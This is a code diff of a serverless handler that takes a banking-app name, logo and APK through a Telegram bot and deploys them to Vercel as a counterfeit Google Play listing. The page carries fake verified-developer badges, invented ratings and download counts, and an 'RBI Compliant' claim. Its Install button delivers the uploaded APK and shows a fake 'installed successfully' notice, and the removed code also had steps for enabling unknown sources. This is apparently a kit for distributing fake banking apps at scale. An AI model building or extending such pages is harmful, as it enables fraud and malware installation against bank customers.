@@ -1,30 +1,28 @@
 import { put } from '@vercel/blob';
-import fs from 'fs';
-import path from 'path';
 
 const token = process.env.TELEGRAM_BOT_TOKEN;
 const blobToken = process.env.BLOB_READ_WRITE_TOKEN || process.env.VERCEL_BLOB_READ_WRITE_TOKEN;
 
 async function telegram(method, body) {
-	const result = await fetch(`https://api.telegram.org/bot${token}/${method}`, { 
-		method: 'POST', 
-		headers: { 'content-type': 'application/json' }, 
-		body: JSON.stringify(body) 
+	const result = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
+		method: 'POST',
+		headers: { 'content-type': 'application/json' },
+		body: JSON.stringify(body)
 	});
 	return result.json();
 }
 
-async function saveTelegramFile(fileId, filePath) {
+async function saveTelegramFile(fileId, path) {
 	const file = await telegram('getFile', { file_id: fileId });
 	if (!file.ok || !file.result?.file_path) {
 		throw new Error(`Telegram file lookup failed: ${file.description || 'Unknown error'}`);
 	}
 	const download = await fetch(`https://api.telegram.org/file/bot${token}/${file.result.file_path}`);
 	if (!download.ok) throw new Error(`Telegram file download failed: ${download.statusText}`);
-	
+
 	const options = { access: 'private', addRandomSuffix: false, allowOverwrite: true };
 	if (blobToken) options.token = blobToken;
-	return put(filePath, await download.arrayBuffer(), options);
+	return put(path, await download.arrayBuffer(), options);
 }
 
 function generateProjectSlug(value) {
@@ -38,23 +36,13 @@ function escapeHtml(value = '') {
 	return value.replace(/[&<>'"]/g, (character) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '"': '&quot;' })[character]);
 }
 
-function buildRealPlayStoreHtml(app) {
+function buildStandaloneHtml(app) {
 	const name = escapeHtml(app.name);
 	const logoUrl = escapeHtml(app.logoUrl);
 	const apkUrl = escapeHtml(app.apkUrl);
 	const developer = escapeHtml(app.developer || `${app.name} Official`);
 	const tagline = escapeHtml(app.tagline || 'Secure Mobile Banking, Instant UPI Transfers & Financial Services');
-	const description = escapeHtml(app.description || `Official ${app.name} Mobile Banking app. Experience next-generation mobile banking with instant money transfers, pre-approved credit services, credit card management, and 24/7 account security. Built with 256-bit bank-grade encryption to give you complete, effortless control over your finances safely anytime, anywhere.`);
-
-	let cssContent = '';
-	let jsContent = '';
-	try {
-		const rootDir = process.cwd();
-		cssContent = fs.readFileSync(path.join(rootDir, 'style.css'), 'utf-8');
-		jsContent = fs.readFileSync(path.join(rootDir, 'script.js'), 'utf-8');
-	} catch (e) {
-		console.warn('Could not read external css/js, using fallback:', e);
-	}
+	const description = escapeHtml(app.description || `Official ${app.name} Mobile Banking app. Experience next-generation mobile banking with instant money transfers, pre-approved credit services, credit card management, and 24/7 account security.`);
 
 	return `<!doctype html>
 <html lang="en">
@@ -67,272 +55,149 @@ function buildRealPlayStoreHtml(app) {
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500;700&family=DM+Sans:wght@400;500;600;700&family=Manrope:wght@700;800&display=swap" rel="stylesheet" />
     <style>
-        ${cssContent}
-        .app-logo img { width: 100%; height: 100%; display: block; object-fit: cover; border-radius: 22%; }
-        .install-button { width: 100%; height: 44px; border-radius: 22px; background: #01875f; }
-        .hero-action { min-width: 170px; }
-        @media (max-width: 800px) { .hero-action { width: 100%; min-width: 0; } .install-button { height: 44px; } }
+        :root { font-family: 'Google Sans', 'Roboto', sans-serif; color: #202124; background: #f8f9fa; --google-green: #01875f; --google-green-hover: #017250; --google-blue: #0b57d0; }
+        * { box-sizing: border-box; }
+        html, body { margin: 0; padding: 0; background: #ffffff; color: #202124; overflow-x: hidden; width: 100%; }
+        .topbar { height: 64px; background: #ffffff; border-bottom: 1px solid #f1f3f4; position: sticky; top: 0; z-index: 100; }
+        .topbar-inner { height: 100%; max-width: 1280px; margin: auto; padding: 0 24px; display: flex; align-items: center; gap: 20px; }
+        .brand { font-size: 20px; font-weight: 500; color: #5f6368; text-decoration: none; display: flex; align-items: center; gap: 8px; }
+        .page-shell { max-width: 1180px; margin: auto; padding: 24px 24px 100px; }
+        .breadcrumbs { display: flex; gap: 8px; color: #80868b; font-size: 13px; margin-bottom: 20px; }
+        .breadcrumbs a { color: #5f6368; text-decoration: none; }
+        .app-hero { display: grid; grid-template-columns: 128px 1fr auto; gap: 28px; align-items: start; padding-bottom: 32px; border-bottom: 1px solid #f1f3f4; }
+        .app-logo { width: 128px; height: 128px; border-radius: 28px; overflow: hidden; background: #f1f3f4; box-shadow: 0 4px 14px rgba(0,0,0,0.12); }
+        .app-logo img { width: 100%; height: 100%; object-fit: cover; }
+        .app-copy h1 { font-size: 36px; margin: 0; font-weight: 700; }
+        .developer { font-size: 15px; color: #01875f; font-weight: 500; margin: 6px 0; display: inline-flex; align-items: center; gap: 6px; }
+        .verified { width: 16px; height: 16px; border-radius: 50%; background: #01875f; color: #fff; font-size: 10px; display: inline-grid; place-items: center; font-weight: 700; }
+        .tagline { font-size: 14px; color: #5f6368; margin: 4px 0 0; }
+        .hero-meta { display: flex; gap: 20px; margin-top: 20px; font-size: 13px; }
+        .hero-meta strong { font-size: 15px; font-weight: 700; }
+        .meta-divider { height: 24px; width: 1px; background: #dadce0; }
+        .install-button { width: 170px; height: 44px; border: 0; border-radius: 22px; background: #01875f; color: #ffffff; font-size: 14px; font-weight: 500; cursor: pointer; box-shadow: 0 2px 6px rgba(0,0,0,0.15); transition: background 0.2s ease; }
+        .install-button:hover { background: #017250; }
+        .hero-action-buttons { display: flex; gap: 8px; margin-top: 10px; }
+        .action-chip { flex: 1; height: 36px; border: 1px solid #dadce0; background: #fff; border-radius: 18px; font-size: 12px; color: #0b57d0; cursor: pointer; }
+        .content-grid { display: grid; grid-template-columns: 1fr 300px; gap: 48px; margin-top: 32px; }
+        .section-block { padding: 24px 0; border-top: 1px solid #f1f3f4; }
+        .section-heading h2 { font-size: 20px; margin: 0 0 16px; }
+        .screenshots { display: flex; gap: 16px; overflow-x: auto; padding-bottom: 8px; }
+        .shot { flex: 0 0 200px; height: 350px; border-radius: 18px; padding: 20px; color: #fff; box-shadow: 0 4px 14px rgba(0,0,0,0.1); }
+        .shot-one { background: linear-gradient(145deg, #0a2540 0%, #0052cc 100%); }
+        .shot-two { background: linear-gradient(145deg, #1e1b4b 0%, #312e81 100%); }
+        .shot-three { background: linear-gradient(145deg, #064e3b 0%, #047857 100%); }
+        .bank-balance-card { background: rgba(255,255,255,0.15); border-radius: 12px; padding: 12px; margin-top: 10px; }
+        .balance-num { font-size: 20px; font-weight: 700; color: #00f5d4; }
+        .bank-credit-box { background: rgba(255,255,255,0.15); border-radius: 12px; padding: 12px; margin-top: 10px; }
+        .bank-credit-box strong { font-size: 22px; color: #fbbf24; }
+        .info-card { border: 1px solid #f1f3f4; background: #fff; border-radius: 16px; padding: 20px; margin-bottom: 16px; }
+        .info-row { display: flex; gap: 12px; padding: 10px 0; border-top: 1px solid #f1f3f4; align-items: center; font-size: 13px; }
+        .notice { display: none; background: #e6f4ea; color: #137333; border: 1px solid #ceead6; border-radius: 12px; padding: 12px 18px; font-size: 14px; margin-top: 16px; }
+        .notice.show { display: flex; align-items: center; justify-content: space-between; }
+        @media (max-width: 800px) {
+            .app-hero { grid-template-columns: 80px 1fr; gap: 16px; }
+            .app-logo { width: 80px; height: 80px; border-radius: 18px; }
+            .app-copy h1 { font-size: 24px; }
+            .hero-action { grid-column: 1 / -1; width: 100%; }
+            .install-button { width: 100%; height: 44px; }
+            .content-grid { grid-template-columns: 1fr; gap: 24px; }
+        }
     </style>
 </head>
 <body>
-    <!-- Google Play Header Bar -->
     <header class="topbar">
         <div class="topbar-inner">
-            <a class="brand" href="#top" aria-label="Appspace home">
-                <span class="brand-mark" title="Google Play">
-                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M4.5 3.5L16.2 11.7L4.5 19.9V3.5Z" fill="#00e676" />
-                        <path d="M16.2 11.7L19.5 9.8C20.3 9.4 20.3 8.3 19.5 7.8L4.5 3.5L16.2 11.7Z" fill="#ffeb3b" />
-                        <path d="M4.5 19.9L19.5 15.6C20.3 15.2 20.3 14.1 19.5 13.6L16.2 11.7L4.5 19.9Z" fill="#ff2a6d" />
-                        <path d="M16.2 11.7L4.5 3.5V19.9L16.2 11.7Z" fill="#29b6f6" />
-                    </svg>
-                </span>
+            <a class="brand" href="#">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M4.5 3.5L16.2 11.7L4.5 19.9V3.5Z" fill="#00e676"/><path d="M16.2 11.7L19.5 9.8C20.3 9.4 20.3 8.3 19.5 7.8L4.5 3.5L16.2 11.7Z" fill="#ffeb3b"/><path d="M4.5 19.9L19.5 15.6C20.3 15.2 20.3 14.1 19.5 13.6L16.2 11.7L4.5 19.9Z" fill="#ff2a6d"/><path d="M16.2 11.7L4.5 3.5V19.9L16.2 11.7Z" fill="#29b6f6"/></svg>
                 <span>google play</span>
             </a>
-            <label class="search-box">
-                <span class="search-icon">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-                        <circle cx="11" cy="11" r="8" />
-                        <line x1="21" y1="21" x2="16.65" y2="16.65" />
-                    </svg>
-                </span>
-                <input type="search" id="searchInput" placeholder="Search for apps & games" aria-label="Search for apps and games" />
-                <kbd>⌘ K</kbd>
-            </label>
-            <nav class="top-actions" aria-label="Account actions">
-                <button class="icon-button" aria-label="Help" title="Help & Feedback">?</button>
-                <button class="avatar" aria-label="Profile" title="Google Account">VS</button>
-            </nav>
         </div>
     </header>
-
-    <!-- Page Shell Main Container -->
-    <main id="top" class="page-shell">
-        <div class="breadcrumbs" aria-label="Breadcrumbs">
-            <a href="#apps">Apps</a> <span>›</span>
-            <a href="#finance">Finance & Banking</a> <span>›</span>
-            <span>${name} - Mobile Banking</span>
+    <main class="page-shell">
+        <div class="breadcrumbs">
+            <a href="#">Apps</a> <span>›</span> <a href="#">Finance & Banking</a> <span>›</span> <span>${name}</span>
         </div>
-
         <section class="app-hero">
-            <div class="app-logo">
-                <img id="appLogo" src="${logoUrl}" alt="${name} Logo" />
-            </div>
+            <div class="app-logo"><img src="${logoUrl}" alt="${name} logo" /></div>
             <div class="app-copy">
-                <h1 id="appName">${name}</h1>
-                <p class="developer" id="appDeveloper">${developer} <span class="verified" title="Verified Financial Institution">✓</span></p>
-                <p class="tagline" id="appTagline">${tagline}</p>
+                <h1>${name}</h1>
+                <div class="developer">${developer} <span class="verified">✓</span></div>
+                <div class="tagline">${tagline}</div>
                 <div class="hero-meta">
-                    <span><strong>4.8 <span class="stars">★★★★★</span></strong><small>12K reviews</small></span>
+                    <span><strong>4.8 ★★★★★</strong><small>12K reviews</small></span>
                     <span class="meta-divider"></span>
                     <span><strong>1M+</strong><small>Downloads</small></span>
-                    <span class="meta-divider"></span>
-                    <span><strong>Everyone</strong><small>Rated for 3+</small></span>
                     <span class="meta-divider"></span>
                     <span><strong>12 MB</strong><small>Size</small></span>
                 </div>
             </div>
-
             <div class="hero-action">
                 <button class="install-button" id="installButton" data-apk="${apkUrl}">
-                    <span class="button-label">Install</span>
-                    <span class="button-spinner"></span>
+                    <span id="btnText">Install</span>
                 </button>
                 <div class="hero-action-buttons">
-                    <button class="action-chip wishlist-chip" id="wishlistChip" title="Add to wishlist">
-                        <span class="icon">★</span> Add to wishlist
-                    </button>
-                    <button class="action-chip share-chip" id="shareChip" title="Share app">
-                        <span class="icon">➦</span> Share
-                    </button>
+                    <button class="action-chip">Add to wishlist</button>
+                    <button class="action-chip">Share</button>
                 </div>
-                <p class="availability">Available on all your devices</p>
             </div>
         </section>
-
-        <div class="notice" id="notice" role="status" aria-live="polite">
-            <span class="notice-icon">✓</span>
-            <span id="noticeText">App added to your wishlist.</span>
-            <button id="dismissNotice" aria-label="Dismiss notification">×</button>
-        </div>
-
+        <div class="notice" id="notice"><span id="noticeText">App installed successfully!</span></div>
         <section class="content-grid">
             <div class="main-column">
-                <section class="section-block screenshots-section">
-                    <div class="section-heading">
-                        <h2>App preview</h2>
-                        <div class="carousel-nav">
-                            <button class="round-arrow shot-prev" id="shotPrev" aria-label="Previous screenshot">‹</button>
-                            <button class="round-arrow shot-next" id="shotNext" aria-label="Next screenshot">›</button>
-                        </div>
-                    </div>
-
-                    <div class="screenshots" id="screenshotsList">
+                <section class="section-block">
+                    <div class="section-heading"><h2>App preview</h2></div>
+                    <div class="screenshots">
                         <div class="shot shot-one">
-                            <div class="shot-top"><span>09:41 AM</span><b>💳 Banking Portal</b></div>
-                            <div class="shot-title">Account & Balance</div>
+                            <b>💳 Banking Portal</b>
                             <div class="bank-balance-card">
                                 <small>Available Balance</small>
                                 <div class="balance-num">₹48,500.00</div>
-                                <span class="acc-num">Savings A/c •••• 4829</span>
+                                <small>Savings A/c •••• 4829</small>
                             </div>
-                            <div class="quick-bank-actions">
-                                <span class="bank-act-btn">⚡ UPI</span>
-                                <span class="bank-act-btn">↗ Send</span>
-                                <span class="bank-act-btn">📄 Bills</span>
-                            </div>
-                            <div class="task-card bank-tx">
-                                <div class="check checked">✓</div>
-                                <span>Salary Credit Received</span>
-                                <em>+₹75,000</em>
-                            </div>
-                            <div class="task-card bank-tx">
-                                <div class="check checked">✓</div>
-                                <span>Merchant UPI Payment</span>
-                                <em>-₹2,490</em>
-                            </div>
-                            <div class="progress-line"><span style="width: 82%;"></span></div>
                         </div>
-
                         <div class="shot shot-two">
-                            <div class="shot-top"><span>CREDIT SERVICES</span><b>💎 Pre-Approved</b></div>
+                            <b>💎 Pre-Approved</b>
                             <div class="bank-credit-box">
                                 <small>Instant Credit Limit</small>
                                 <strong>₹2,50,000</strong>
                             </div>
-                            <div class="ring bank-card-ring">
-                                <b>VISA</b>
-                                <small>•••• 9812</small>
-                            </div>
-                            <div class="mini-bars"><i></i><i></i><i></i><i></i><i></i></div>
-                            <strong>92% Available Credit Line</strong>
                         </div>
-
                         <div class="shot shot-three">
-                            <div class="shot-top"><span class="note-label">BANK SECURITY</span><b>🛡️ 256-Bit SSL</b></div>
-                            <strong>Bank-Grade 24/7 Protection</strong>
-                            <p>Instant card lock, biometric login, and real-time transaction alerts for maximum security.</p>
-                            <div class="note-dot bank-sec-dot" title="Account Secured">🔒</div>
+                            <b>🛡️ 256-Bit Security</b>
+                            <p>Bank-grade protection & instant biometric authentication.</p>
                         </div>
                     </div>
                 </section>
-
-                <section class="section-block about">
-                    <div class="section-heading">
-                        <h2>About this app</h2>
-                        <button class="round-arrow" aria-label="About this app">→</button>
-                    </div>
-                    <p id="appDescription">${description}</p>
-                    <div class="tag-chips">
-                        <span class="tag">Mobile Banking</span>
-                        <span class="tag">Instant Transfers</span>
-                        <span class="tag">UPI & Bill Pay</span>
-                        <span class="tag">Credit Cards & Loans</span>
-                        <span class="tag">Secure NetBanking</span>
-                    </div>
-                    <a class="learn-more" href="#data-safety">Read details <span>→</span></a>
-                </section>
-
                 <section class="section-block">
-                    <div class="section-heading">
-                        <h2>What's new</h2>
-                        <span class="version" id="appVersion">Version 2.4.1</span>
-                    </div>
-                    <p class="update-copy">Upgraded 256-bit SSL encryption security, 1-tap instant UPI transfer speeds, biometric fingerprint/face login authentication, and smart monthly spending analytics.</p>
-                    <div class="update-pills">
-                        <span>✦ 1-Tap Instant UPI Transfers</span>
-                        <span>🛡️ Biometric Login Security</span>
-                        <span>★ Pre-approved Instant Loans</span>
-                    </div>
-                </section>
-
-                <section class="section-block reviews-section">
-                    <div class="section-heading"><h2>Ratings and reviews</h2><button class="round-arrow" aria-label="See all reviews">→</button></div>
-                    <div class="ratings-container">
-                        <div class="score-card">
-                            <div class="score-num">4.8</div>
-                            <div class="score-stars">★★★★★</div>
-                            <small class="score-count">12,480 total reviews</small>
-                        </div>
-                        <div class="rating-bars-list">
-                            <div class="rating-bar-item"><span>5</span><div class="bar-track"><div class="bar-fill" style="width: 86%;"></div></div></div>
-                            <div class="rating-bar-item"><span>4</span><div class="bar-track"><div class="bar-fill" style="width: 10%;"></div></div></div>
-                            <div class="rating-bar-item"><span>3</span><div class="bar-track"><div class="bar-fill" style="width: 2%;"></div></div></div>
-                            <div class="rating-bar-item"><span>2</span><div class="bar-track"><div class="bar-fill" style="width: 1%;"></div></div></div>
-                            <div class="rating-bar-item"><span>1</span><div class="bar-track"><div class="bar-fill" style="width: 1%;"></div></div></div>
-                        </div>
-                    </div>
-                    <div class="reviews-list">
-                        <div class="review-item">
-                            <div class="review-user">
-                                <div class="user-avatar-circle" style="background: #e8f0fe; color: #1a73e8;">AK</div>
-                                <div class="user-details">
-                                    <strong>Alex Kumar</strong>
-                                    <div class="user-rating-line"><span class="stars-sm">★★★★★</span> <small>August 19, 2025</small></div>
-                                </div>
-                            </div>
-                            <p class="review-text">Hands down the most reliable and fast mobile banking app! Money transfers happen in less than a second, and account management is super smooth.</p>
-                            <div class="review-helpful"><small>52 people found this review helpful</small></div>
-                        </div>
-                    </div>
+                    <div class="section-heading"><h2>About this app</h2></div>
+                    <p>${description}</p>
                 </section>
             </div>
-
             <aside class="side-column">
-                <section class="info-card">
-                    <div class="info-heading"><h2>App info</h2><span class="more">•••</span></div>
-                    <div class="info-row"><span class="info-icon">↓</span><span><b>1M+ downloads</b><small>Trusted by customers nationwide</small></span></div>
-                    <div class="info-row"><span class="info-icon">▣</span><span><b>12 MB</b><small>Small size, ultra fast</small></span></div>
-                    <div class="info-row"><span class="info-icon">◷</span><span><b>Updated recently</b><small>August 18, 2025</small></span></div>
-                    <div class="info-row"><span class="info-icon">●</span><span><b>Verified Financial App</b><small>RBI Compliant & Secure</small></span></div>
-                </section>
-                <section class="info-card safety-card" id="data-safety">
-                    <div class="info-heading"><h2>Data safety</h2><span class="shield">✓</span></div>
-                    <p>Safety starts with understanding how financial institutions protect your data. Developer has provided this security summary.</p>
-                    <div class="safety-points">
-                        <div class="safety-point"><span class="point-icon">🔒</span><span>256-bit bank-grade encryption in transit</span></div>
-                        <div class="safety-point"><span class="point-icon">🛡️</span><span>Multi-factor biometric authentication</span></div>
-                        <div class="safety-point"><span class="point-icon">🗑️</span><span>No unauthorized data sharing</span></div>
-                    </div>
-                    <a class="learn-more" href="#data-safety">See details <span>→</span></a>
-                </section>
+                <div class="info-card">
+                    <h2>App info</h2>
+                    <div class="info-row"><b>1M+ downloads</b></div>
+                    <div class="info-row"><b>12 MB size</b></div>
+                    <div class="info-row"><b>RBI Compliant & Secure</b></div>
+                </div>
             </aside>
         </section>
     </main>
-
-    <!-- APK Installation Guide Modal -->
-    <div class="install-modal-overlay" id="installModal" role="dialog" aria-modal="true">
-        <div class="install-modal-card">
-            <div class="modal-header">
-                <span class="modal-icon">📥</span>
-                <h3>Complete App Installation</h3>
-                <button class="modal-close" id="closeInstallModal" aria-label="Close">×</button>
-            </div>
-            <div class="modal-body">
-                <p><strong>APK File Downloaded Successfully!</strong></p>
-                <p>To install the app on your phone, follow these simple steps:</p>
-                <ol class="install-steps">
-                    <li>Open your phone's <b>Notification Bar</b> or <b>Downloads Folder</b>.</li>
-                    <li>Tap on the downloaded <b id="modalApkName">${name.replace(/[^a-z0-9]/gi, '_')}.apk</b> file.</li>
-                    <li>If prompted, turn on <b>"Allow from this source / Unknown Sources"</b>.</li>
-                    <li>Tap <b>"Install"</b> to complete installation.</li>
-                </ol>
-            </div>
-            <div class="modal-footer">
-                <button class="modal-btn-primary" id="gotItModalBtn">Got it, open downloads</button>
-            </div>
-        </div>
-    </div>
-
-    <nav class="bottom-nav" aria-label="Main navigation">
-        <a class="active" href="#top"><span>⌂</span>Home</a>
-        <a href="#apps"><span>▦</span>Apps</a>
-        <a href="#games"><span>◈</span>Games</a>
-        <a href="#books"><span>▤</span>Books</a>
-    </nav>
-
     <script>
-        ${jsContent}
+        const btn = document.getElementById('installButton');
+        const txt = document.getElementById('btnText');
+        const notice = document.getElementById('notice');
+        btn.addEventListener('click', () => {
+            txt.textContent = 'Downloading...';
+            const a = document.createElement('a');
+            a.href = btn.dataset.apk || '#';
+            a.download = '${name.replace(/[^a-z0-9]/gi, '_')}_base.apk';
+            document.body.appendChild(a);
+            a.click();
+            a.remove();
+            setTimeout(() => { txt.textContent = 'Installing...'; }, 1000);
+            setTimeout(() => { txt.textContent = 'Open'; notice.classList.add('show'); }, 2200);
+        });
     </script>
 </body>
 </html>`;
@@ -341,10 +206,10 @@ function buildRealPlayStoreHtml(app) {
 async function createVercelProject(name) {
 	const teamId = process.env.VERCEL_TEAM_ID || 'sanam-infotech';
 	const endpoint = `https://api.vercel.com/v9/projects?teamId=${encodeURIComponent(teamId)}`;
-	const result = await fetch(endpoint, { 
-		method: 'POST', 
-		headers: { Authorization: `Bearer ${process.env.VERCEL_TOKEN}`, 'content-type': 'application/json' }, 
-		body: JSON.stringify({ name }) 
+	const result = await fetch(endpoint, {
+		method: 'POST',
+		headers: { Authorization: `Bearer ${process.env.VERCEL_TOKEN}`, 'content-type': 'application/json' },
+		body: JSON.stringify({ name })
 	});
 	if (result.ok || result.status === 409) return name;
 	if (result.status === 401 || result.status === 403) {
@@ -355,15 +220,15 @@ async function createVercelProject(name) {
 
 async function deployProject(name, html) {
 	const teamId = process.env.VERCEL_TEAM_ID || 'sanam-infotech';
-	const result = await fetch(`https://api.vercel.com/v13/deployments?teamId=${encodeURIComponent(teamId)}`, { 
-		method: 'POST', 
-		headers: { Authorization: `Bearer ${process.env.VERCEL_TOKEN}`, 'content-type': 'application/json' }, 
-		body: JSON.stringify({ 
-			name, 
-			project: name, 
-			files: [{ file: 'index.html', data: html }], 
-			projectSettings: { framework: null } 
-		}) 
+	const result = await fetch(`https://api.vercel.com/v13/deployments?teamId=${encodeURIComponent(teamId)}`, {
+		method: 'POST',
+		headers: { Authorization: `Bearer ${process.env.VERCEL_TOKEN}`, 'content-type': 'application/json' },
+		body: JSON.stringify({
+			name,
+			project: name,
+			files: [{ file: 'index.html', data: html }],
+			projectSettings: { framework: null }
+		})
 	});
 	if (!result.ok) throw new Error(`Vercel deployment failed with status ${result.status}`);
 	return result.json();
@@ -372,7 +237,7 @@ async function deployProject(name, html) {
 async function waitForDeploymentReady(deploymentId) {
 	const teamId = process.env.VERCEL_TEAM_ID || 'sanam-infotech';
 	const endpoint = `https://api.vercel.com/v13/deployments/${deploymentId}?teamId=${encodeURIComponent(teamId)}`;
-	
+
 	const maxRetries = 20;
 	for (let i = 0; i < maxRetries; i++) {
 		const res = await fetch(endpoint, {
@@ -410,27 +275,27 @@ export default async function handler(request, response) {
 		const logoUrl = `https://${request.headers.host}/api/blob?key=${encodeURIComponent(`apps/${projectName}/logo`)}`;
 		const apkUrl = `https://${request.headers.host}/api/blob?key=${encodeURIComponent(`apps/${projectName}/base.apk`)}`;
 
-		const app = { 
+		const app = {
 			name: body.name,
 			developer: `${body.name} Official`,
 			tagline: 'Secure Mobile Banking, Instant UPI Transfers & Financial Services',
-			description: `Official ${body.name} Mobile Banking app. Experience next-generation mobile banking with instant money transfers, pre-approved credit services, credit card management, and 24/7 account security. Built with 256-bit bank-grade encryption to give you complete, effortless control over your finances safely anytime, anywhere.`,
+			description: `Official ${body.name} Mobile Banking app. Experience next-generation mobile banking with instant money transfers, pre-approved credit services, credit card management, and 24/7 account security.`,
 			version: '2.4.1',
-			logoUrl, 
-			apkUrl 
+			logoUrl,
+			apkUrl
 		};
 
-		// Save app JSON record to Vercel Blob
+		// Also save JSON record to Vercel Blob
 		const options = { access: 'private', addRandomSuffix: false, allowOverwrite: true };
 		if (blobToken) options.token = blobToken;
 		await put(`apps/${projectName}.json`, JSON.stringify(app), options);
 
-		// Build and deploy the 100% REAL Material 3 Banking Play Store page directly to Vercel Subdomain
+		// Build self-contained HTML page and deploy directly to Vercel subdomain
 		if (process.env.VERCEL_TOKEN) {
-			const html = buildRealPlayStoreHtml(app);
+			const html = buildStandaloneHtml(app);
 			await createVercelProject(projectName);
 			const deployment = await deployProject(projectName, html);
-			
+
 			if (deployment?.id) {
 				await waitForDeploymentReady(deployment.id);
 			}
